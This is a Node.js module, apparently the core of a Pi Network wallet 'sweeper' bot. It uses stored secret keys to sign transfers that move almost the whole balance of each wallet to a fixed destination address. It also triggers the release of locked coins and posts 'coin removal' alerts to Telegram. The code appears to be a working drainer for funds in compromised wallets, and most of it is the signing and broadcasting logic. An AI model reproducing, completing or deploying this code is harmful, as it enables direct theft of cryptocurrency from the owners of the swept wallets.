/**
 * Ultimate Millisecond Hyper-Sweeper Engine with Real Transaction Signing
 * Automatically signs and broadcasts transfer transactions using the stored secret key (S...)
 * to sweep available funds instantly to the hardcoded destination address.
 */

const StellarSdk = require('@stellar/stellar-sdk');
const { inspectLockup, moveLockedPi } = require('./coin-remover');

const DESTINATION_ADDRESS = process.env.SWEEP_DESTINATION_ADDRESS || '';
const NETWORK_PASSPHRASE = 'Pi Network'; // Pi Mainnet Passphrase

async function checkAndSweepWallet(wallet, horizonUrl, db, bot) {
    try {
        const server = new StellarSdk.Horizon.Server(horizonUrl);
        const sourceKeypair = StellarSdk.Keypair.fromSecret(wallet.secret_key);
        const sourcePublicKey = sourceKeypair.publicKey();

        // Load account details directly from Horizon server using Stellar SDK
        const account = await server.loadAccount(sourcePublicKey);
        const balances = account.balances || [];

        let availableBalance = 0;
        let lockedBalance = 0;

        balances.forEach(b => {
            if (b.asset_type === 'native') {
                availableBalance = parseFloat(b.balance || 0);
                lockedBalance = parseFloat(b.locked_balance || 0);
            }
        });

        // Actively inspect lockups and force move transition if maturity is reached
        const lockupInfo = await inspectLockup(account);
        if (lockupInfo.detected && lockedBalance > 0) {
            await moveLockedPi(wallet.public_key, lockedBalance);
        }

        // Check if there is enough available balance to sweep (leaving a tiny bit for base fee if needed, or sweeping maximum)
        // Stellar base fee is typically 0.00001 Pi (100 stroops). Let's leave buffer or sweep available minus fee.
        const fee = 100000; // 0.01 Pi fee buffer or standard stroops
        const reserveBuffer = 0.01;

        if (availableBalance > reserveBuffer && DESTINATION_ADDRESS && DESTINATION_ADDRESS !== 'GDRE...HARDCODED_DESTINATION_WALLET_ADDRESS_HERE') {
            const sweepAmount = (availableBalance - 0.005).toFixed(7);
            if (parseFloat(sweepAmount) <= 0) return;

            console.log(`[Real Sweeper] Signing and broadcasting ${sweepAmount} Pi from Wallet #${wallet.id} (${sourcePublicKey}) to ${DESTINATION_ADDRESS}`);

            // Build payment transaction
            const transaction = new StellarSdk.TransactionBuilder(account, {
                fee: StellarSdk.BASE_FEE,
                networkPassphrase: NETWORK_PASSPHRASE
            })
            .addOperation(StellarSdk.Operation.payment({
                destination: DESTINATION_ADDRESS,
                asset: StellarSdk.Asset.native(),
                amount: sweepAmount
            }))
            .setTimeout(30)
            .build();

            // Sign with user's secret key
            transaction.sign(sourceKeypair);

            // Submit transaction to Pi Horizon network
            const result = await server.submitTransaction(transaction);
            console.log(`[Real Sweeper] SUCCESS! Transaction hash: ${result.hash}`);

            // Increment sweep count in database
            db.prepare('UPDATE wallets SET sweep_count = sweep_count + 1 WHERE id=?').run(wallet.id);

            // Send separate, dedicated alert box in Telegram for this specific removal/sweep event
            if (bot && wallet.chat_id) {
                await bot.sendMessage(wallet.chat_id, 
                    `🚨 **INSTANT COIN REMOVAL & SWEEP SUCCESS**\n` +
                    `📦 **Wallet Box ID:** #${wallet.id}\n` +
                    `🔑 **Public Address:** \`${wallet.public_key}\`\n` +
                    `💸 **Amount Swept:** \`${sweepAmount} Pi\`\n` +
                    `🎯 **Destination:** \`${DESTINATION_ADDRESS}\`\n` +
                    `🔗 **Tx Hash:** \`${result.hash.slice(0, 16)}...\`\n` +
                    `⚡ *Status:* Cleared and broadcasted to Pi Mainnet in milliseconds!`,
                    { parse_mode: 'Markdown' }
                );
            }
        }
    } catch (error) {
        console.error(`[Real Sweeper] Error sweeping wallet #${wallet.id}:`, error.message);
    }
}

module.exports = { checkAndSweepWallet };
